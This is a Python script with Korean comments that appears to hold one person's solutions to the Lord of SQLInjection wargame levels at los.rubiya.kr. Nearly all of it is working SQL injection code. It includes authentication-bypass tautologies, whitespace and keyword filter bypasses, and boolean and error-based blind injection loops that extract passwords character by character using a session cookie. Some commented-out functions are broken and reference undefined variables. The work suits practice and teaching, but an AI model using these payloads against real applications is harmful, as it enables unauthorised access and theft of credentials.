# -*- coding:utf-8 -*-
import urllib.parse
import requests
# 간단한 http 요청시 사용
import http.cookiejar
import binascii



'''
def iron_golem_other_char_check(hdr,pw_index,ans):
    for ascii_char in range(33,128):
        inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))=" + str(ascii_char) + ",1,(select 1 union select 2)) -- "
        
        params = urllib.parse.urlencode({"pw" : inject_sentence})

        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params
        
        print(url)

        request = urllib.request.Request(url, headers = hdr)
        cj = urllib.request.CookieJar()
        request = urllib.request.HTTPCookieProcessor()
        response = urllib.request.urlopen(request)

        data = response.read()
        data = data.decode('utf-8')

        if data.find("Subquery returns more than 1 row") == -1:
            ans = ans + str(ascii_char) + " "
            return ans

def iron_golem_admin_check(cookie,pw_index,mid):
    #해당 mid 값이 해당 자리에 맞는 값인지를 확인

    inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))="+ str(mid) + ",1,(select 1 union select 2)) -- "

    encoded_params = urllib.parse.urlencode({"pw":inject_sentence})

    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"

    print(url)

    find_pw_char = blind_sqlinjection(cookie,url, encoded_params, )
    
    request = urllib.request.Request(url, headers = hdr)
    response = urllib.request.urlopen(request) 

    data = response.read()
    data = data.decode('utf-8')

    if data.find("Subquery returns more than 1 row") == -1:
        ans = [1,mid]
        return ans
    
    ans = [0,0]

    return ans
    



                
#한글 유니코드값 10진수 범위 : 44032 ~ 50813

def iron_golem(cookie):
    for pw_index in range(1,18):
        kor_range = [44032, 50813]
        op = '<'

        while(kor_range[0] != kor_range[1] and (kor_range[1]-kor_range[0])!=1):
            mid = (kor_range[0] + kor_range[1]) // 2

            
            if(admin_chk[1] != 0):
                ans = ans + str(admin_chk[1]) + " "
                print(ans)
                break

            inject_sentence = "1' or if(ord(substring(pw," + str(pw_index) + ",1))" + op + str(mid) + ",1,(select 1 union select 2)) -- "

            params = urllib.parse.urlencode({"pw":inject_sentence})

            url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?%s" % params

            print(url)

            request = urllib.request.Request(url, headers = hdr)
            response = urllib.request.urlopen(request)
            
            data = response.read()
            data = data.decode('utf-8')

            if data.find("Subquery returns more than 1 row") == -1:
                if(op == '<'):
                    kor_range[1] = mid
                elif(op == '>'):
                    kor_range[0] = mid
            else:
                if(op == '<'): 
                    op = '>'
                elif(op == '>'):
                    op = '<'

        if(admin_chk[0] != 1):
            for admin_index in kor_range:
                admin_chk = iron_golem_admin_check(hdr,pw_index,admin_index)
                
                if(admin_chk[0] == 1):
                    ans = ans + str(admin_chk[1]) + " "
                    print(ans)
                    break

            ans = iron_golem_other_char_check(hdr,pw_index,ans)
            print(ans)
        
'''

def iron_golem(cookie):
    ans = ""
    temp = ""

    for pw_length in range(1,33):
        for pw_char in range(33,128):
            inject_sentence = "1\' or if(ord(substring(pw," + str(pw_length) + ",1))=" + str(pw_char) + ",1,(select 1 union select 2)) --+\'"
            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})

            url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"

            print(url + inject_sentence)

            find_pw_char = error_based_blind_sqlinjection(cookie,url, encoded_params, pw_char)

            if find_pw_char != 0 and find_pw_char != 1:
                ans =  ans + chr(pw_char).lower()
                print(ans)
                break
            else:
                continue

    print("pw is" + ans)
def dragon(cookie):
    url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php?"
    
    params = "pw=%27%0a%20and%20pw=%271%27%20or%20id=%27admin"

    url = url +  params

    default_sqlinjection(cookie,url)

    print(params)

def xavis(cookie):

    ans = ""
    temp = ""

    for pw_length in range(1,25):
        for pw_char in range(33,128):
            inject_sentence = "1' or ascii(substring(hex(pw)," + str(pw_length) + ",1))=" + str(pw_char) + " -- "
            # 파이썬 상에서 공백은 + 로 인식, 그래서 urlencode 과정에서 + 값이 넘어가면서 --+ 이 주석처리하는 요소로 처리됨

            
            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})

            url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
            
            print(url + "?" + encoded_params)

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)


            if find_pw_char != 0 and find_pw_char != 1:
                ans = ans + chr(pw_char).lower()
                print(ans)
                break

            elif find_pw_char == 1:
                temp = chr(pw_char).lower()
                print(temp)
            
            if pw_char == 126:
                ans = ans + temp.lower()
                
            else:
                continue
    
    ans = ans.replace('0000','')
    
    ans = list(ans)
    
    to_kor = list()
    temp_str = ""

    cnt = 0
    for add_sp in ans:
        temp_str = temp_str + add_sp
        cnt = cnt + 1
        
        if cnt % 2 == 0:
            to_kor.append(temp_str)
            temp_str = ""
    
    for add_16_index in range(len(to_kor)):
        to_kor[add_16_index] = "\\x" + to_kor[add_16_index]
    
    to_kor = ''.join(to_kor)

    to_kor = to_kor.encode('euc-kr')

    print(to_kor)
    print(type(to_kor))
    print(to_kor.decode('euc-kr'))
        

def nightmare(cookie):
    url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?"
    params = "pw=')<1;%00"
    
    url = url + params
    print(params)
    
    default_sqlinjection(cookie, url)

        
def succubus(cookie):
    url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php?"
    params = "\&&pw= or 1=1 --+"
    
    url = url + params
    print(params)
    
    default_sqlinjection(cookie, url)

def giant(cookie):
    url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?"
    params = "shit=%0b"

    # 수직 탭, 또다른 공백 우회법

    url = url + params

    print(params)
    
    default_sqlinjection(cookie, url)

    
def bugbear(cookie):
    temp = ""
    ans = ""
    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"

    for pw_length in range(1,9):
        for pw_char in range(33,127):
            inject_sentence = "no=123||right(left(pw," + str(pw_length) + "),1)in%0a(char(" + str(pw_char) + "))"
            # 기본적으로 mysql 데이터도 대소문자 구분 안하고 질의, 대소문자 구분할려면 필드명에 binary() 로 감싸야 대소문자 구분
            print(url + inject_sentence)
            encoded_params = inject_sentence
            

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)


            if find_pw_char != 0 and find_pw_char != 1:
                ans = ans + chr(pw_char).lower()
                print(ans)
                break

            elif find_pw_char == 1:
                temp = chr(pw_char)
                print(temp)
            
            if pw_char == 126:
                ans = ans + temp.lower()
                
            else:
                continue

    print("pw is " + ans)


def darknight(cookie):
    temp = ""
    ans = ""
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"

    for pw_length in range(1,9):
        for pw_char in range(33,127):
            inject_sentence = "no=123||ord(right(left(pw," + str(pw_length) + "),1)) like " + str(pw_char)
            
            print(url + inject_sentence)
            encoded_params = inject_sentence

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)


            if find_pw_char != 0 and find_pw_char != 1:
                ans = ans + chr(pw_char)
                print(ans)
                break

            elif find_pw_char == 1:
                temp = chr(pw_char)
                print(temp)
            
            if pw_char == 126:
                ans = ans + temp
                
            else:
                continue

    print("pw is " + ans)

def default_sqlinjection(cookie, url):
    try:
        cookie_dict = {'PHPSESSID':cookie}
        response = requests.get(url, cookies = cookie_dict)

        if response.text.find("<h2>Clear!</h2>"):
            print("Clear!")
        else:
            print('Solve Fail')
    except requests.HTTPError as e:
        print(e)


def error_based_blind_sqlinjection(cookie, url, encoded_params, pw_char):
    try:
        
        cookie_dict = {'PHPSESSID':cookie}
        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
        
        if response.text.find("Subquery returns more than 1 row") != -1:
            return 0
        else:
            return pw_char

    except urllib.error.HTTPError as e:
        print(e)
def blind_sqlinjection(cookie, url, encoded_params, pw_char):
    try:
        
        cookie_dict = {'PHPSESSID':cookie}
        response = requests.get(url, params = encoded_params, cookies = cookie_dict)
        
        if response.text.find("<h2>Hello admin</h2>") != -1:
            return pw_char
        elif response.text.find("<h2>Hello guest</h2>") != -1:
            return 1
        else:
            return 0

    except urllib.error.HTTPError as e:
        print(e)
def zombie_assassin(cookie):
    
    url = "https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php"
    
    params = "?id=\"&&pw=%20--%201%20ro+"
    
    url = url + params

    print(params)

    default_sqlinjection(cookie,url)
    

def assassin(cookie):
    temp = ""
    ans = ""
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?"

    for pw_length in range(1,9):
        for pw_char in range(33,127):
            inject_sentence = "pw=" + ans + chr(pw_char) + "%"
            print(url + inject_sentence)
            encoded_params = inject_sentence

            if pw_char == 63 or pw_char == 37 or pw_char == 95:
                continue

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)

            if find_pw_char != 0 and find_pw_char != 1:
                ans = ans + chr(pw_char).lower()
                print(ans)
                break
            
            elif find_pw_char == 1:
                temp = chr(pw_char)
                print(temp)
            
            if pw_char == 126:
                ans = ans + temp.lower()
                
            else:
                continue

    print("pw is " + ans)

'''
def golem(cookie):
    ans = ""
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

    for pw_length in range(1,9):
        for pw_char in range(33,128):
            inject_sentence = "1\'||right(left(pw," + str(pw_length) + "),1) like " + chr(pw_char) + " -- \'"
                
            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)

            if find_pw_char != 0:
                ans = ans + chr(pw_char)
                print(ans)
                break
            else:
                continue
    return "pw is " + ans
'''

# 골렘 풀이 다른버전

def golem(cookie):
    ans = ""
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"

    for pw_length in range(1,9):
        for pw_char in range(33,128):
            inject_sentence = "1\'||ascii(right(left(pw," + str(pw_length) + "),1)) like " + str(pw_char) + " -- \'"
                
            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)

            if find_pw_char != 0:
                ans = ans + chr(pw_char)
                print(ans)
            else:
                continue
    return "pw is " + ans

def orge(cookie):
    ans = ""
    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

    for pw_length in range(1,9):
        for pw_char in range(33,128):
            inject_sentence = "1'||ascii(substring(pw," + str(pw_length) + ",1))=" + str(pw_char) + "-- \'"
                
            encoded_params = urllib.parse.urlencode({'pw':inject_sentence})

            find_pw_char = blind_sqlinjection(cookie, url, encoded_params, pw_char)

            if find_pw_char != 0:
                ans = ans + chr(pw_char)
                print(ans)
            else:
                continue
    return "pw is " + ans
def orc(cookie):
    ans = ""
    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
    
    for pw_length in range(1,9):
        for pw_char in range(33,128):
            inject_sentence = "1\' or ascii(substring(pw," + str(pw_length) + ",1))=" + str(pw_char) + "--\'"
            
            encoded_params = urllib.parse.urlencode({'pw' : inject_sentence})

            find_pw_char = blind_sqlinjection(cookie,url,encoded_params, pw_char)
            
            if find_pw_char != 0:
               ans = ans + chr(pw_char)
               print(ans)
               break
            elif find_pw_char == 0:
                continue
    
    return "pw is " + ans

def skeleton(cookie):

    url = "https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php"
    params = "?pw=1\' or id=\'admin\' -- \'"
    # 뒤에 구문을 무시하도록 주석, 싱글쿼터 이용

    url = url + params

    print(params)
    
    default_sqlinjection(cookie, url)

def vampire(cookie):
    url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"
    params = "?id=adadminmin"
    # admin 문자를 공백으로 치환

    url = url + params

    print(params)
    
    default_sqlinjection(cookie, url)

def troll(cookie):

    # mysql 에서는 대소문자를 구분하지 않음

    url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
    params = "?id=Admin"

    url = url + params

    print(params)
    
    default_sqlinjection(cookie, url)

def darkelf(cookie):
    url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"
    params = "?pw=1%27%20||%20id=%27admin%27%20--%20%27"
    
    url = url + params

    print(params)

    default_sqlinjection(cookie,url)

            
def wolfman(cookie):
    url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"
    params = "?pw=1%27%09or%09id=%27admin%27%09--%09%27"

    url = url + params
    
    print(params)
    
    default_sqlinjection(cookie, url)
    
def goblin(cookie):
    ans = ""
    url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
    admin_hex = binascii.hexlify('admin'.encode()).decode()
    # 'admin'.encode() 통해서 byte 형식으로 전환
    # decode() 를 통해서 unicode, 즉 문자열로 전환

    inject_sentence = "?no=2 or id=0x" + admin_hex
    url = url + inject_sentence
    
    print(inject_sentence)
    default_sqlinjection(cookie, url)

def cobolt(cookie):
    
    url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
    inject_sentence = "?id=admin\' or 1=1 -- "
    url = url + inject_sentence
    
    print(inject_sentence)

    default_sqlinjection(cookie, url)


def gremlin(cookie):
    
    url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
    inject_sentence = "?id=admin&&pw=123\' or 1=1 -- \'"
    url = url + inject_sentence

    print(inject_sentence)
    
    default_sqlinjection(cookie, url)
        